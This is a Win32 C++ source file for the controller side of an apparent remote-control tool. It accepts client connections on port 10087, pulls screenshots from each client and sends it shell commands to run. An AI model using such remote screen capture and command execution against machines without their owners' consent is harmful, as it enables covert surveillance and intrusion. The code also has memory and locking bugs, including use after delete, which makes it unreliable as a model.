
#include "resource.h"
#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")

#include <commctrl.h>
#pragma comment( lib, "comctl32.lib" )

//宏定义

//屏幕包
#define	TO_CLIENT_SCREEN	20001
#define GET_CLIENT_SCREEN	20002



//包结构
#pragma pack(push)
#pragma pack(1)
struct MyWrap
{
	DWORD	dwType;			//包的类型
	DWORD	dwLength;		//包数据的长度
	PVOID	lpBuffer;		//包数据
};
#pragma pack(pop)



//辅助显示
struct _Show
{
	HWND	hWnd;
	DWORD 	dwItem;
};


//客户端结构
struct ClientData
{
	MyWrap		stWrap;			//客户端的数据包
	SOCKET		hSocketClient;	//用来和指定客户端传输数据的套接字句柄
	HANDLE		hThread;		//用来接收包的线程句柄
	_Show		stShow;			//显示辅助（）线程参数

	HWND		hScreenWindow;	//屏幕窗口句柄
	HANDLE		hScreenThread;	//屏幕显示线程句柄

	HWND		hCmdWindow;		//Cmd窗口句柄
	HANDLE		hCmdThread;		//Cmd显示线程句柄

	ClientData* Next;			//指向下一个ClientData结构
};


ClientData* pHandClient = NULL;		//客户端数据链表头指针




HWND hWinMain;					//主窗口句柄
SOCKET hSocketWait;				//用于等待客户端连接的套接字句柄		


HANDLE hmutex;					//定义全局互斥对象句柄（用来同步收到来自客户端的包）
HANDLE hmutex1;					//定义全局互斥对象句柄（用来同步收到发送到客户端的包）


BOOL _stdcall _CheckClient();
VOID _stdcall _InitSocket();
BOOL _stdcall _ToClient(_Show* lpScreen);
BOOL CALLBACK _DialogScreen(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
BOOL _stdcall _ShowScreen(_Show* lpScreen);
BOOL _stdcall _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
BOOL _stdcall _ShowCmd(_Show* lpScreen);
BOOL _stdcall _ReceiveClient();
BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{

	MSG	stMsg;
	CreateDialogParam(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), NULL, _DialogMain, 0);
	while (GetMessage(&stMsg, NULL, 0, 0))
	{

		TranslateMessage(&stMsg);
		DispatchMessage(&stMsg);
	}
	return stMsg.wParam;
}



//主窗口窗口过程
BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	POINT		stPos;
	static HMENU hMenu;
	static LVHITTESTINFO	lo;
	switch (message)
	{

	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case ID_40001:				//显示截屏
			DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG2), NULL, _DialogScreen, lo.iItem);
			break;
		case ID_40003:
			DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG3), NULL, _DialogCmd, lo.iItem);
		}
		break;
	case WM_NOTIFY:
		switch (((LPNMHDR)lParam)->code)
		{
		case NM_RCLICK:			//在项目上右击
			switch (((LPNMITEMACTIVATE)lParam)->hdr.idFrom)
			{
			case IDC_LIST1:
				GetCursorPos(&stPos);					//弹出窗口
				TrackPopupMenu(GetSubMenu(hMenu, 0), TPM_LEFTALIGN, stPos.x, stPos.y, NULL, hWnd, NULL);
				lo.pt.x = ((LPNMITEMACTIVATE)lParam)->ptAction.x;
				lo.pt.y = ((LPNMITEMACTIVATE)lParam)->ptAction.y;
				ListView_SubItemHitTest(GetDlgItem(hWnd, IDC_LIST1), &lo);
				break;
			}
			break;
		}
		break;
	case WM_CLOSE:
		PostMessage(hWnd, WM_DESTROY, 0, 0);
		break;
	case WM_DESTROY:
		closesocket(hSocketWait);
		WSACleanup();

		PostQuitMessage(0);
		break;
	case WM_INITDIALOG:
		hWinMain = hWnd;
		hmutex = CreateMutex(NULL, false, NULL);//创建互斥对象并返回其句柄
		hmutex1 = CreateMutex(NULL, false, NULL);//创建互斥对象并返回其句柄
		hMenu = LoadMenu(GetModuleHandle(NULL), MAKEINTRESOURCE(IDR_MENU1));
		_InitSocket();					//初始化网络

		//创建线程用来循环接收客户端连接
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ReceiveClient, NULL, 0, NULL);


		break;

	default:
		return FALSE;
	}

	return TRUE;
}


//网络初始话
VOID _stdcall _InitSocket()
{
	//初始化
	WORD	wVersionRequested;
	WSADATA	wsaData;
	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);


}



//接收客户端连接
BOOL _stdcall _ReceiveClient()
{
	char szIP[] = TEXT("IP地址");
	char szPort[] = TEXT("Port端口");
	LVCOLUMN lvColumn;			//列属性
	LVITEM lvItem;				//行属性
	memset(&lvItem, 0, sizeof(lvItem));
	memset(&lvColumn, 0, sizeof(lvColumn));


	ListView_SetExtendedListViewStyle(GetDlgItem(hWinMain, IDC_LIST1), LVS_EX_FULLROWSELECT);

	lvColumn.mask = LVCF_TEXT | LVCF_WIDTH;
	lvColumn.cx = 200;
	lvColumn.pszText = szIP;
	ListView_InsertColumn(GetDlgItem(hWinMain, IDC_LIST1), 0, &lvColumn);

	lvColumn.cx = 80;
	lvColumn.pszText = szPort;
	ListView_InsertColumn(GetDlgItem(hWinMain, IDC_LIST1), 1, &lvColumn);




	//创建套接字
	hSocketWait = socket(
		AF_INET,
		SOCK_STREAM,
		0);




	//绑定和监听端口
	sockaddr_in addr;				//用于描述ip和端口的结构体
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");
	addr.sin_port = htons(10087);	//此端口用来接收谁来连接服务端	
	bind(hSocketWait, (sockaddr*)&addr, sizeof(sockaddr_in));

	listen(hSocketWait, 5);			//监听


	//接收连接
	sockaddr_in remoteAddr;
	int nLen = sizeof(remoteAddr);

	ClientData* pClient = pHandClient;		//辅助指针
	_Show lpScreen;						//线程参数

	TCHAR szBuffer[256];

	int i;
	while (1)
	{

		memset(&remoteAddr, 0, sizeof(remoteAddr));
		remoteAddr.sin_family = AF_INET;
		SOCKET h = accept(hSocketWait, (sockaddr*)&remoteAddr, &nLen);				//等待客户端连接



		i = 1;												//增加一个客户端数据结构
		pClient = pHandClient;
		if (pHandClient == NULL)							
		{
			pHandClient = new ClientData( );
			pClient = pHandClient;
			pClient->Next = NULL;
			i = 0;
		}
		else
		{
			while (pClient->Next != NULL)
			{
				pClient = pClient->Next;
				i++;
			}
			
			pClient->Next = new ClientData( );
			pClient = pClient->Next;
			pClient->Next = NULL;
		}



		pClient->hSocketClient = h;
		pClient->stWrap.lpBuffer = NULL;

		lpScreen.dwItem = i;
		pClient->hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ToClient, &lpScreen, 0, NULL);					//创建线程来循环接收数据包

		memset(&lvItem, 0, sizeof(lvItem));
		lvItem.mask = LVIF_TEXT;
		lvItem.iItem = i;
		ListView_InsertItem(GetDlgItem(hWinMain, IDC_LIST1), &lvItem);

		wsprintf(szBuffer, TEXT("%s"), inet_ntoa(remoteAddr.sin_addr));
		lvItem.iSubItem = 0;
		lvItem.pszText = szBuffer;
		ListView_SetItem(GetDlgItem(hWinMain, IDC_LIST1), &lvItem);

		wsprintf(szBuffer, TEXT("%d"), ntohs(remoteAddr.sin_port));
		lvItem.iSubItem = 1;
		lvItem.pszText = szBuffer;
		ListView_SetItem(GetDlgItem(hWinMain, IDC_LIST1), &lvItem);
	}



	return 1;
}




//循环收取来自客户端的数据包
BOOL _stdcall _ToClient(_Show * lpScreen)
{
	BYTE szBuffer[256];
	BYTE* lpBuf;
	int len;
	int len1;
	int flag = 0;				//用来结束线程

	MyWrap	stSendWrap;			//请求包
	ClientData* pClient		 = pHandClient;		//辅助指针
	ClientData* pClientFront			;		//辅助指针
	for (int i = 0;i < lpScreen->dwItem; i++)
	{
		pClient = pClient->Next;
	}



	while (1)
	{

		len = 0;
		WaitForSingleObject(hmutex, INFINITE);		//请求互斥对象


		//接收来自客户端的数据(循环接收)
		memset(szBuffer, 0, sizeof(szBuffer));
		while (1)
		{
			len = recv(pClient->hSocketClient, (char*)(szBuffer + len), 8 - len, 0);
			if (len <= 0)							//recv错误
			{
				flag = 1;
				break;
			}
			if (len == 8)
				break;
		}
		if (flag == 1)		//如果recv出错,断开连接结束线程
		{
			SendMessage(pClient->hScreenWindow, WM_CLOSE, 0, 0);								//关闭屏幕显示窗口和线程
			SendMessage(pClient->hCmdWindow, WM_CLOSE, 0, 0);									//关闭cmd窗口

																							//删除客户端数据链中相应的客户端
			pClient = pHandClient;
			if (lpScreen->dwItem == 0)
				pHandClient = NULL;
			else
			{
				for (int i = 0;i < lpScreen->dwItem; i++)
				{
					pClientFront = pClient;
					pClient = pClient->Next;
				}
				pClient->Next = pClient->Next;

			}
			delete pClient;

											
			ListView_DeleteItem(GetDlgItem(hWinMain, IDC_LIST1), pClient->stShow.dwItem);		//删除对应UI中的连接
			break;																				//退出线程
		}
		pClient->stWrap.dwType = szBuffer[0] + szBuffer[1] * 0x100 + szBuffer[2] * 0x10000 + szBuffer[3] * 0x1000000;
		pClient->stWrap.dwLength = szBuffer[4] + szBuffer[5] * 0x100 + szBuffer[6] * 0x10000 + szBuffer[7] * 0x1000000;
		pClient->stWrap.lpBuffer = new BYTE[pClient->stWrap.dwLength + 1]( );
		
		memset(szBuffer, 0, sizeof(szBuffer));
		len = 0;
		len1 = 0;
		while (1)
		{
			len1 = recv(pClient->hSocketClient, (char*)((DWORD)pClient->stWrap.lpBuffer + len), pClient->stWrap.dwLength - len, 0);
			len = len + len1;
			if (len == pClient->stWrap.dwLength)
				break;
		}

		ReleaseMutex(hmutex);						//释放互斥对象
		ReleaseMutex(hmutex);						//释放互斥对象
		WaitForSingleObject(hmutex, INFINITE);		//请求互斥对象
		delete[] pClient->stWrap.lpBuffer;			//释放内存



		switch (pClient->stWrap.dwType)
		{
		case TO_CLIENT_SCREEN:				//屏幕包
			stSendWrap.dwType = GET_CLIENT_SCREEN;				//发送命令。（截屏）
			stSendWrap.dwLength = 0;
			WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);
			ReleaseMutex(hmutex1);						//释放互斥对象1
			break;
		}

	}
	return 0;
}




//显示屏幕窗口(窗口回调)
BOOL CALLBACK _DialogScreen(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	
	ClientData* pClient = pHandClient;		//辅助指针
	
	switch (message)
	{
	case WM_CLOSE:										//关闭显示屏幕线程
		pClient = pHandClient;
		while (pClient!= NULL)
		{
			if (pClient->hScreenWindow == hWnd)
			{
				TerminateThread(pClient->hScreenThread, 0);
				CloseHandle(pClient->hScreenThread);
			}
			pClient = pClient->Next;
		}
		EndDialog(hWnd, 0);
		
		break;
	case WM_INITDIALOG:
		
		for (int i = 0;i < lParam; i++)		//保存对应屏幕窗口信息
			pClient = pClient->Next;

		pClient->stShow.hWnd = hWnd;
		pClient->stShow.dwItem = lParam;

		pClient->hScreenThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ShowScreen, &pClient->stShow, 0, NULL);
		pClient->hScreenWindow = hWnd;
		
		break;
	default:
		return FALSE;
	}
	return TRUE;
}




//cmd窗口（窗口回调）
BOOL _stdcall _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	ClientData* pClient = pHandClient;		//辅助指针
	MyWrap	stSendWrap;			//请求包
	char	szBuffer[256] ;

	switch (message)
	{
	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case IDC_BUTTON1:
			pClient = pHandClient;
			while (pClient != NULL)
			{
				if (pClient->hCmdWindow == hWnd)
				{
					GetDlgItemText(hWnd, IDC_EDIT2, szBuffer, sizeof(szBuffer));

					stSendWrap.dwType = 10002;
					stSendWrap.dwLength = lstrlen(szBuffer);
					WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
					send(pClient->hSocketClient, (char*)&stSendWrap, 8,0);				//请求执行cmd
					send(pClient->hSocketClient, szBuffer, stSendWrap.dwLength, 0);
					ReleaseMutex(hmutex1);						//释放互斥对象1

				}
				pClient = pClient->Next;
			}
			
			break;
		}
		break;
	case WM_CLOSE:										
		pClient = pHandClient;
		while (pClient != NULL)
		{
			if (pClient->hCmdWindow == hWnd)
			{
				TerminateThread(pClient->hCmdThread, 0);
				CloseHandle(pClient->hCmdThread);

			}
			pClient = pClient->Next;
		}
		EndDialog(hWnd, 0);
		break;
	case WM_INITDIALOG:
		for (int i = 0;i < lParam; i++)		//保存对应cmd窗口信息
			pClient = pClient->Next;
		pClient->stShow.hWnd = hWnd;
		pClient->stShow.dwItem = lParam;
		pClient->hCmdThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ShowCmd, &pClient->stShow, 0, NULL);

		pClient->hCmdWindow = hWnd;
		break;
	default:
		return FALSE;
	}
	return TRUE;

}





//显示截屏
BOOL _stdcall _ShowScreen(_Show* lpScreen)
{


	HDC		hDeskDc;			//桌面的DC句柄
	HDC		hMyDc;				//我们的DC(兼容桌面DC)
	HBITMAP hMyBitMap;			//创建位图(与桌面兼容)
	DWORD		nWidth = 0;				//桌面的像素宽
	DWORD		nHeight = 0;			//桌面的像素高

	ClientData* pClient = pHandClient;		//辅助指针
	for (int i = 0;i < lpScreen->dwItem; i++)
	{
		pClient = pClient->Next;
	}

	MyWrap	stSendWrap;			//请求包
	stSendWrap.dwType = GET_CLIENT_SCREEN;
	stSendWrap.dwLength = 0;
	WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
	int nnn = send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);
	ReleaseMutex(hmutex1);						//释放互斥对象1

	hDeskDc = GetDC(lpScreen->hWnd);
	hMyDc = CreateCompatibleDC(hDeskDc);



	while (1)
	{
		
		/*if (pClient == NULL)
			break;*/
		if (pClient->stWrap.dwType == TO_CLIENT_SCREEN)			//显示屏幕包
		{


			WaitForSingleObject(hmutex, INFINITE);//请求互斥对象

			nWidth = ((DWORD*)pClient->stWrap.lpBuffer)[0];
			nHeight = ((DWORD*)pClient->stWrap.lpBuffer)[1];
			hMyBitMap = CreateCompatibleBitmap(hDeskDc, nWidth, nHeight);
			SelectObject(hMyDc, hMyBitMap);
			SetBitmapBits(hMyBitMap, pClient->stWrap.dwLength, pClient->stWrap.lpBuffer);

			BitBlt(
				hDeskDc,
				0,				//x
				0,				//y
				nWidth,
				nHeight,
				hMyDc,
				0,
				0,
				SRCCOPY			//拷贝模式
			);
			DeleteObject(hMyBitMap);
			ReleaseMutex(hmutex);//释放互斥对象句柄

		}

	}
	ReleaseDC(lpScreen->hWnd, hDeskDc);
	DeleteDC(hMyDc);



	return 0;
}



//显示cmd
BOOL _stdcall _ShowCmd(_Show* lpScreen)
{

	ClientData* pClient = pHandClient;		//辅助指针
	for (int i = 0;i < lpScreen->dwItem; i++)
	{
		pClient = pClient->Next;
	}

	while (1)
	{

		if (pClient->stWrap.dwType == 10001)			//显示cmd
		{
			WaitForSingleObject(hmutex, INFINITE);		//请求互斥对象
			SendMessage(GetDlgItem(pClient->hCmdWindow, IDC_EDIT1), EM_SETSEL, -2, -1);					//最加写cmd数据
			SendMessage(GetDlgItem(pClient->hCmdWindow, IDC_EDIT1), EM_REPLACESEL, true, (DWORD)pClient->stWrap.lpBuffer);
			ReleaseMutex(hmutex);						//释放互斥对象句柄
		}

	}

	return 0;
}


